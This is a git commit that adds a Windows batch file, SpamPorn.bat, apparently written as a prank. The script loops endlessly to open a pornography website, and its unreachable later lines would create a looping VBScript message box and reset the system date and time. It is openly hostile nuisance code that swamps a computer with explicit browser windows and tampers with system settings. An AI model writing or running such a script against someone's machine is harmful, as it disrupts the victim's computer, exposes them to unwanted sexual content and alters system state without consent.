ced610c533ceab1038e422dfd55591526b617bbc
tQbFjOtLd213 <69489862+tQbFjOtLd213@users.noreply.github.com>
2020-09-14 11:12:19 +1000

    Add files via upload

---
+++ SpamPorn.bat
@@ -0,0 +1,10 @@
+:looop
+
+start www.pornhub.com
+goto looop
+echo do>>msg.vbs
+echo Msgbox"HAHAHAHAHAHAHAHAHAHAHAHAH",0+0,"FURRY PORN ">>msg.vbs
+echo loop>>msg.vbs
+start msg.vbs
+date 22/08/2014
+time 06:06:06
